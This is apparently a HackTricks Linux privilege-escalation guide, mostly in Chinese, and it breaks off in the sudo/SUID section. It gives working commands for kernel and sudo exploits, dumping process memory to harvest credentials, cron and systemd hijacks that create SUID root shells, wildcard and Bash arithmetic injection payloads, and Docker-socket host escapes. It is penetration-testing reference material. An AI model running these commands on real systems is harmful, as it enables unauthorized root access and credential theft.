# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## 系统信息

### OS 信息

让我们开始收集关于正在运行的 OS 的一些信息
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### 路径

如果你 **对 `PATH` 变量中任何文件夹具有写权限**，你可能能够劫持某些库或二进制文件：
```bash
echo $PATH
```
### 环境信息

环境变量中有有趣的信息、密码或 API 密钥吗？
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

检查 kernel 版本，查看是否存在可用于 escalate privileges 的 exploit。
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
你可以在这里找到不错的有漏洞的内核列表以及一些已经 **compiled exploits**： [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) 和 [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
其他可以找到一些 **compiled exploits** 的站点： [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

要从该网站中提取所有有漏洞的内核版本，可以执行：
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
可以帮助搜索 kernel exploits 的工具有：

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)（在 victim 上执行，仅检查针对 kernel 2.x 的 exploits）

始终 **在 Google 上搜索 kernel 版本**，也许你的 kernel 版本被写在某个 kernel exploit 中，这样你就可以确认该 exploit 是否有效。

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo 版本

基于下列存在漏洞的 sudo 版本：
```bash
searchsploit sudo
```
你可以使用这个 grep 检查 sudo 版本是否存在漏洞。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

来自 @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg 签名验证失败

查看 **smasher2 box of HTB** 以获取有关如何利用该 **vuln** 的示例
```bash
dmesg 2>/dev/null | grep "signature"
```
### 更多系统枚举
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 枚举可能的防御措施

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

如果你在 docker container 内，你可以尝试从中逃逸：

{{#ref}}
docker-security/
{{#endref}}

## 驱动器

检查 **what is mounted and unmounted**，在哪里以及为什么。如果有任何是 unmounted 的，你可以尝试去 mount 它并检查是否包含敏感信息。
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 有用的软件

枚举有用的二进制文件
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
另外，检查是否安装了 **任何编译器**。如果你需要使用某些 kernel exploit，这很有用，因为建议在将要使用它的机器（或在一台类似的机器）上编译它。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 已安装的易受攻击软件

检查 **已安装软件包和服务的版本**。可能存在某些较旧的 Nagios 版本（例如），可以被利用来提升权限…\  
建议手动检查那些更可疑的已安装软件的版本。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
如果你有对该主机的 SSH 访问权限，也可以使用 **openVAS** 来检查主机上安装的过时或存在已知漏洞的软件。

> [!NOTE] > _注意：这些命令会显示大量大多无用的信息，因此建议使用像 OpenVAS 或类似的应用来检查任何已安装软件版本是否容易受到已知漏洞利用的影响_

## 进程

查看正在执行的 **哪些进程**，并检查是否有任何进程拥有 **超出其应有的权限**（例如由 root 执行的 tomcat？）
```bash
ps aux
ps -ef
top -n 1
```
始终检查是否可能存在 [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md)。**Linpeas** 通过检查进程命令行中的 `--inspect` 参数来检测这些情况。\
另外**检查你对进程二进制文件的权限**，也许你可以覆盖别人的文件。

### 进程监控

你可以使用像 [**pspy**](https://github.com/DominicBreuker/pspy) 这样的工具来监控进程。这样在识别频繁执行的或在满足特定条件时运行的易受攻击进程时非常有用。

### 进程内存

某些服务会将 **credentials in clear text inside the memory** 保存在内存中。\
通常你需要 **root privileges** 来读取属于其他用户的进程内存，因此这通常在你已经是 root 时更有用，用来发现更多凭据。\
不过，记住 **as a regular user you can read the memory of the processes you own**。

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB 脚本
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

对于给定的进程 ID，**maps 显示该进程虚拟地址空间中内存的映射方式**；它还显示**每个映射区域的权限**。伪文件 **mem** **暴露了进程的内存本身**。从 **maps** 文件我们知道哪些 **内存区域是可读的** 以及它们的偏移。我们使用这些信息来**seek 到 mem 文件并转储所有可读区域**到一个文件。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` 提供对系统的 **物理** 内存的访问，而不是虚拟内存。内核的虚拟地址空间可以通过 /dev/kmem 访问。\
通常，`/dev/mem` 只能被 **root** 和 **kmem** 组读取。
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump 是对来自 Sysinternals 套件中用于 Windows 的经典 ProcDump 工具在 Linux 上的重新构想。获取： [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### 工具

要转储进程内存，你可以使用：

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_你可以手动移除 root 要求并转储由你拥有的进程
- Script A.5 来自 [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (需要 root)

### 进程内存中的凭据

#### 手动示例

如果你发现 authenticator 进程正在运行：
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
你可以 dump 进程（参见前面的章节以了解 dump 进程内存的不同方法），并在内存中搜索凭证：
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

该工具 [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) 会 **从内存中窃取明文凭证** 并从一些 **已知文件** 中获取。它需要 root 权限才能正常工作。

| 功能                                              | 进程名称             |
| ------------------------------------------------- | -------------------- |
| GDM 密码 (Kali Desktop, Debian Desktop)           | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### 搜索正则/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## 计划任务/Cron jobs

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

如果 web “Crontab UI” 面板 (alseambusher/crontab-ui) 以 root 身份运行并且只绑定到 loopback，仍然可以通过 SSH 本地端口转发访问它并创建特权任务以提升权限。

典型流程
- 发现仅绑定到 loopback 的端口（例如 127.0.0.1:8000）以及 Basic-Auth realm，使用 `ss -ntlp` / `curl -v localhost:8000`
- 在运行时工件中查找凭据：
  - 备份/脚本（使用 `zip -P <password>`）
  - systemd 单元暴露 `Environment="BASIC_AUTH_USER=..."`、`Environment="BASIC_AUTH_PWD=..."`
- 建立隧道并登录:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- 创建一个高权限作业并立即运行（会生成 SUID shell）:
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- 使用它：
```bash
/tmp/rootshell -p   # root shell
```
加固
- 不要以 root 身份运行 Crontab UI；将其限制为专用用户并授予最小权限
- 绑定到 localhost，并通过 firewall/VPN 进一步限制访问；不要重复使用密码
- 避免在 unit files 中嵌入 secrets；使用 secret stores 或 root-only EnvironmentFile
- 为 on-demand job executions 启用 audit/logging

检查是否有任何 scheduled job 存在漏洞。你可能可以利用由 root 执行的脚本（wildcard vuln？能否修改 root 使用的文件？使用 symlinks？在 root 使用的目录中创建特定文件？）
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

例如，在 _/etc/crontab_ 中你可以找到 PATH： _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_注意 user 用户对 /home/user 具有写权限_)

如果在该 crontab 中 root 用户尝试在未设置 PATH 的情况下执行某个命令或脚本。例如： _\* \* \* \* root overwrite.sh_\
然后，你可以通过使用以下方式获得 root shell：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron 使用带通配符的脚本 (Wildcard Injection)

如果脚本以 root 身份执行，并且命令中包含“**\***”，你可以利用这一点造成意外行为（例如 privesc）。示例：
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**如果通配符出现在像** _**/some/path/\***_ **这样的路径前面，则它不是易受攻击的（即使** _**./\***_ **也不是）。**

阅读以下页面以获取更多通配符利用技巧：


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash 算术扩展注入（在 cron 日志解析器中）

Bash 在 ((...))、$((...)) 和 let 中的算术求值之前，会先执行参数/变量扩展和命令替换。如果一个以 root 身份运行的 cron/parser 读取不受信任的日志字段并将其放入算术上下文，攻击者可以注入命令替换 $(...)，当 cron 运行时该命令将在 root 权限下执行。

- 为什么它有效：在 Bash 中，扩展发生的顺序为：参数/变量扩展、命令替换、算术扩展，然后是单词拆分和路径名扩展。所以像 `$(/bin/bash -c 'id > /tmp/pwn')0` 这样的值会先被替换（运行命令），然后剩下的数字 `0` 用于算术运算，这样脚本可以继续而不会报错。

- 典型易受攻击的模式：
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- 利用方式：让攻击者可控的文本写入被解析的日志，使得看起来像数字的字段包含命令替换并以一个数字结尾。确保你的命令不向 stdout 输出（或将其重定向），这样算术运算仍然有效。
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron 脚本覆盖与 symlink

如果你 **可以修改由 root 执行的 cron 脚本**，你可以非常容易地获得一个 shell：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
如果由 root 执行的脚本使用一个 **你拥有完全访问权限的目录**，那么删除该文件夹并 **创建一个 symlink 文件夹，指向另一个由你控制的脚本所在的目录** 可能会很有用。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### 频繁的 cron jobs

你可以监视进程，查找每隔 1、2 或 5 分钟被执行的进程。也许你可以利用它来提权。

例如，要 **在 1 分钟内每 0.1 秒监视一次**，**按执行次数最少排序** 并删除被执行次数最多的命令，可以执行：
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**你也可以使用** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (这将监控并列出每个启动的进程)。

### 隐形 cron jobs

可以创建一个 cronjob，**在注释后放置回车字符**（不包含换行字符），cron job 仍会生效。示例（注意回车字符）：
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## 服务

### 可写的 _.service_ 文件

检查是否可以写入任何 `.service` 文件，如果可以，您 **可以修改它**，以便它 **执行** 您的 **后门**，当服务 **启动**、**重启** 或 **停止** 时（可能需要等待机器重启）。\
例如，在 .service 文件中创建后门，使用 **`ExecStart=/tmp/script.sh`**

### 可写的 service 二进制文件

请记住，如果您对由服务执行的二进制文件拥有 **写权限**，您可以修改它们以植入后门，这样当服务被重新执行时，后门就会被执行。

### systemd PATH - 相对路径

您可以查看 **systemd** 使用的 PATH：
```bash
systemctl show-environment
```
如果你发现你可以在该路径的任意文件夹中**write**，你可能能够**escalate privileges**。你需要搜索在服务配置文件中使用的**相对路径**，例如：
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
然后，在你可写入的 systemd PATH 文件夹内创建一个与相对路径二进制文件同名的 **可执行文件**，当服务被要求执行易受攻击的动作（**Start**, **Stop**, **Reload**）时，你的 **后门将被执行**（非特权用户通常无法 start/stop 服务，但检查是否可以使用 `sudo -l`）。

**Learn more about services with `man systemd.service`.**

## **Timers**

**Timers** 是 systemd 的 unit 文件，文件名以 `**.timer**` 结尾，用于控制 `**.service**` 文件或触发事件。**Timers** 可用作替代 cron 的方案，因为它们内建对日历时间事件和单调时间事件的支持，并且可以异步运行。

你可以枚举所有的 timers：
```bash
systemctl list-timers --all
```
### 可写定时器

如果你可以修改一个定时器，就可以让它执行 systemd.unit 的某些现有单元（例如 `.service` 或 `.target`）
```bash
Unit=backdoor.service
```
在文档中你可以看到 Unit 是什么：

> 该 unit 会在此 timer 到期时被激活。参数是一个 unit 名称，其后缀不是 ".timer"。如果未指定，此值默认为一个 service，其名称与 timer unit 相同，仅后缀不同。（见上文。）建议被激活的 unit 名称和 timer unit 的 unit 名称应除后缀外保持一致。

因此，要滥用此权限你需要：

- 找到某个 systemd unit（例如 `.service`），它正在 **执行一个可写的二进制文件**
- 找到某个 systemd unit，它正在 **执行一个相对路径** 并且你对 **systemd PATH** 拥有 **可写权限**（以模拟该可执行文件）

**Learn more about timers with `man systemd.timer`.**

### **启用定时器**

要启用定时器，你需要 root 权限并执行：
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
注意 **timer** 是通过在 `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` 上创建一个符号链接来被 **激活** 的。

## 套接字

Unix Domain Sockets (UDS) 在客户端-服务器模型中允许在同一台或不同机器上的 **进程间通信**。它们使用标准的 Unix 描述符文件进行计算机间通信，并通过 `.socket` 文件来配置。

Sockets 可以使用 `.socket` 文件进行配置。

**通过 `man systemd.socket` 可以了解更多关于 sockets 的信息。** 在该文件中，可以配置多个有趣的参数：

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: 这些选项各不相同，但总体上用于 **指示将在哪监听** 该 socket（AF_UNIX 套接字文件的路径、要监听的 IPv4/6 地址和/或端口号等）。
- `Accept`: 接受一个布尔参数。如果为 **true**，则为每个传入连接生成一个**service instance**，并且只将连接 socket 传递给它。如果为 **false**，则所有监听 sockets 本身会**传递给启动的 service 单元**，并且对所有连接只启动一个 service 单元。对于 datagram sockets 和 FIFOs，此值被忽略，因为单个 service 单元会无条件地处理所有传入流量。**默认值为 false**。出于性能考虑，建议新守护进程仅以适合 `Accept=no` 的方式编写。
- `ExecStartPre`, `ExecStartPost`: 接受一条或多条命令行，分别在监听的 **sockets**/FIFOs 被创建并绑定之前或之后**执行**。命令行的第一个词必须是绝对文件名，随后是进程的参数。
- `ExecStopPre`, `ExecStopPost`: 在监听的 **sockets**/FIFOs 被**关闭**并移除之前或之后分别**执行**的附加 **命令**。
- `Service`: 指定在有**传入流量**时要**激活**的 **service** 单元名称。此设置仅允许用于 Accept=no 的 socket。它默认指向与 socket 同名（替换后缀）的 service。通常情况下，使用此选项并非必要。

### 可写的 .socket 文件

如果你发现一个**可写**的 `.socket` 文件，你可以在 `[Socket]` 段的开头**添加**诸如 `ExecStartPre=/home/kali/sys/backdoor` 的内容，此 backdoor 将在 socket 被创建之前执行。因此，你**可能需要等到机器重启。**\
_注意系统必须正在使用该 socket 文件配置，否则 backdoor 不会被执行_

### 可写的 sockets

如果你**发现任何可写的 socket**（_这里指的是 Unix Sockets，而不是配置文件 `.socket`_），那么你就**可以与该 socket 通信**，并可能利用其中的漏洞。

### 枚举 Unix Sockets
```bash
netstat -a -p --unix
```
### 原始连接
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

注意可能存在一些 **sockets listening for HTTP** requests (_我不是指 .socket files，而是作为 unix sockets 的文件_)。你可以用以下命令检查：
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
如果该 socket **responds with an HTTP** request，那么你可以与其 **communicate**，并可能 **exploit** 某些漏洞。

### 可写的 Docker Socket

The Docker socket，通常位于 `/var/run/docker.sock`，是一个关键文件，需要加以保护。默认情况下，它对 `root` 用户和 `docker` 组的成员是可写的。拥有对该 socket 的写权限可能导致 privilege escalation。下面是如何利用这一点的分解，以及当 Docker CLI 不可用时的替代方法。

#### **Privilege Escalation with Docker CLI**

如果你对 Docker socket 有写权限，你可以使用以下命令来 escalate privileges：
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
这些命令允许你运行一个 container，以 root 权限访问主机的文件系统。

#### **直接使用 Docker API**

在 Docker CLI 不可用的情况下，仍然可以使用 Docker API 和 `curl` 命令来操纵 Docker socket。

1.  **列出 Docker Images：** 检索可用 images 列表。

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **创建一个 Container：** 发送请求以创建一个将主机根目录挂载进去的 container。

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

启动新创建的 container：

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **附着到 Container：** 使用 `socat` 建立到 container 的连接，从而在其中执行命令。

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

在建立 `socat` 连接后，你可以直接在 container 内执行命令，并以 root 权限访问主机的文件系统。

### 其他

注意，如果你对 docker socket 有写权限，因为你**属于组 `docker`**，你有[**更多的提权方法**](interesting-groups-linux-pe/index.html#docker-group)。如果[**docker API 在某个端口监听**，你也可能能够攻破它](../../network-services-pentesting/2375-pentesting-docker.md#compromising)。

在以下位置查看 **更多从 docker 逃逸或滥用它以提升权限的方法**：


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) 提权

如果你发现自己可以使用 **`ctr`** 命令，请阅读以下页面，因为**你可能能够滥用它来提升权限**：


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** 提权

如果你发现自己可以使用 **`runc`** 命令，请阅读以下页面，因为**你可能能够滥用它来提升权限**：


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus 是一个复杂的进程间通信 (IPC) 系统，允许应用程序高效地交互和共享数据。它为现代 Linux 系统设计，提供了一个用于不同形式应用通信的健壮框架。

该系统用途广泛，支持增强进程间数据交换的基本 IPC，类似于增强的 UNIX 域套接字。此外，它有助于广播事件或信号，促进系统组件之间的无缝集成。例如，来自 Bluetooth daemon 的来电信号可以促使音乐播放器静音，从而改善用户体验。D-Bus 还支持远程对象系统，简化应用之间的服务请求和方法调用，简化了传统上复杂的流程。

D-Bus 基于允许/拒绝模型运行，根据匹配策略规则的累积效果来管理消息权限（方法调用、信号发送等）。这些策略指定与 bus 的交互，可能通过利用这些权限导致提权。

在 /etc/dbus-1/system.d/wpa_supplicant.conf 中提供了此类策略的一个示例，详细说明了 root 用户拥有、发送和接收 fi.w1.wpa_supplicant1 的消息的权限。

未指定用户或组的策略适用于所有人，而“default”上下文策略适用于未被其他特定策略覆盖的所有主体。
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**在这里了解如何 enumerate 和 exploit D-Bus communication：**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **网络**

对网络进行 enumerate 并确定主机的位置总是很有趣。

### 通用 enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### 开放端口

始终检查在你获得访问权限后，之前无法与之交互的机器上运行的网络服务：
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

检查你是否可以嗅探流量。如果可以，你可能能够抓取一些凭证。
```
timeout 1 tcpdump
```
## Users

### Generic Enumeration

检查你是 **who**，你拥有什么 **privileges**，系统中有哪些 **users**，哪些可以 **login**，哪些具有 **root privileges**：
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### 大 UID

一些 Linux 版本受一个漏洞影响，允许 **UID > INT_MAX** 的用户提升权限。更多信息： [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**利用它**：**`systemd-run -t /bin/bash`**

### 组

检查你是否是某个可能授予你 root 权限的**组成员**：


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### 剪贴板

如果可能，检查剪贴板中是否有任何有价值的信息
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### 密码策略
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 已知密码

如果您**知道环境中的任何密码**，请**尝试使用该密码以每个用户身份登录**。

### Su Brute

如果您不介意产生大量噪音，并且计算机上存在 `su` 和 `timeout` 二进制文件，您可以尝试使用 [su-bruteforce](https://github.com/carlospolop/su-bruteforce) 进行暴力破解。\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) 使用 `-a` 参数也会尝试对用户进行暴力破解。

## 可写 PATH 滥用

### $PATH

如果您发现可以在 $PATH 的某个文件夹中**写入**，您可能能够通过在可写文件夹中**创建一个 backdoor**——文件名为某个将由不同用户（理想情况下为 root）执行的命令——来提升权限，前提是该命令**不会从位于您可写文件夹之前的文件夹**在 $PATH 中被加载。

### SUDO and SUID

您可能被允许使用 sudo 执行某些命令，或者某些命令可能设置了 suid 位。使用以下方式检查：
```bash
sudo -l #Check commands you can execute with sudo
